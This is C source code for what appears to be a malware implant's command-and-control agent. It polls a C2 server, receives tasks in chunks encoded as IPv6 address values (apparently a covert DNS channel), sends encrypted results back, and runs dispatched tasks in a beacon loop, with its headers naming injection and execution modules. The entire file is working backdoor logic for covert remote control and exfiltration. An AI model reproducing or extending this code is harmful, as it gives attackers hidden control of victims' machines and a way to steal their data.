#include "Support/String.h"
#include "Macro/Macro.h"
#include "Debug.h"
#include "Transport/Transport.h"
#include "Support/Memory.h"
#include "Support/General.h"
#include "Support/Network.h"
#include "Core/Initialiser.h"
#include "Parser/Parser.h"
#include "Core/Tasks/Modules/Execution.h"
#include "Core/Tasks/Modules/Injection.h"
#include "Packer/Packer.h"
#include "Cryptography/Encryption.h"
#include "Hams.h"
#if defined(_WIN32) || defined(_WIN64)
#include <windows.h>
#endif

char TaskBufferDoneCode[] = {0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0};
int IPv6ChuckDataSize = 16;

int DownloadTask(char *TaskType, PPARSER Parser)
{
    unsigned char *Buffer=0;
    int TotalSize = 0;
    int ChunkCount = 0;
    int Status = 0;
    unsigned char *IPv6 = 0;
    unsigned char Data[50] = {0};
    while (1)
    {
        IPv6 = NotifyC2(0, TaskType); // Need to be free
        if (IPv6 == 0)
        {
            RED_DPRINT("[-] Unable to DownloadTask Connection Error\n");
            Sleep(1000);
            continue;
        }
        else if (!VerifyTask(IPv6))
        {
            RED_DPRINT("Task Not Found!\n");
            break;
        }
        else if (!memcmp(IPv6, TaskBufferDoneCode, sizeof(TaskBufferDoneCode)))
        {

            ParserNew(Parser, Buffer, TotalSize);
            GREEN_DPRINT("Task Downloaded Successfuly\n");
            Status = 1;
            break;
        }
        else
        {
            Memcpy(Data, IPv6, IPv6ChuckDataSize);
            Buffer = HRealloc(Buffer, IPv6ChuckDataSize + TotalSize, TotalSize);
            Memcpy(Buffer + TotalSize, Data, IPv6ChuckDataSize);
            DPRINT("ChunkCount [%d]\n", ChunkCount);
            TotalSize = IPv6ChuckDataSize + TotalSize;
            ChunkCount++;
            HFree(IPv6,INET6_ADDRSTRLEN);
            Memset(Data, 0, sizeof(Data));
            IPv6 = 0;
        }
    }
Clean:
    HFree(IPv6,INET6_ADDRSTRLEN);
    HFree(Buffer,TotalSize);
    return Status;
}

int SendResult(unsigned char *Data, int DataSize, char *Type1, char *Type2)
{

    char *Base32Buffer = 0;
    unsigned char *IPv6 = 0;
    int Base32BufferSize=0;
    Base32Buffer = EncryptData(Data, DataSize,&Base32BufferSize);
    if (Base32Buffer == 0)
    {
        RED_DPRINT("SendResult EncryptData Error\n");
        goto Clean;
    }
    IPv6 = NotifyC2(strlen(Base32Buffer), Type1); // Need to be free
    if (IPv6 == 0)
    {
        RED_DPRINT("[-] Unable to SendResult Connection Error\n");
        goto Clean;
    }
    GREEN_DPRINT("NotifyC2 OK!\n");
    HFree(IPv6,INET6_ADDRSTRLEN);
    if (PackageSend(Base32Buffer, strlen(Base32Buffer), Type2))
    {
        EndNotifyC2();
    }

Clean:
    HFree(Base32Buffer,Base32BufferSize);
    

    return 1;
}

int GetTask()
{

    unsigned char *IPv6 = 0;
    int TaskID = 0;
    char *end = 0;
    IPv6 = NotifyC2(NULL, MacroAskTaskCode); // Need to be free
    if (IPv6 == 0)
    {
        RED_DPRINT("Connection Error\n");
        goto Clean;
    }
    Memcpy(&TaskID, IPv6, 2);
    HFree(IPv6,INET6_ADDRSTRLEN);
    GREEN_DPRINT("NEW TASK ID [%d]\n", TaskID);
Clean:  
    return TaskID;
}

int AskTask()
{
    int TaskType = GetTask();
    if (TaskType != 0)
    {
        if (TaskType == NoTaskCode)
        {
            DPRINT("No More Task Go To Sleep\n")
            return 1;
        }
        for (int j = 0; j < funclistlength; j++)
        {
            if (funclistName[j] == TaskType)
            {
                YELLOW_DPRINT("Task Found\n");
                (*funclistPtr[j])();
                return 1;
            }
        }
    }

    return 0;
}

int AgentManager()
{
    // Seed the random number generator
    Sleep(3000);
    while (1)
    {
        int TaskState = AskTask();
        if (TaskState)
        {
            GREEN_DPRINT("TASK DONE!\n")
        }
        else
        {
            RED_DPRINT("TASK Not Found!\n")
        }
        GoSleep();
    }
}
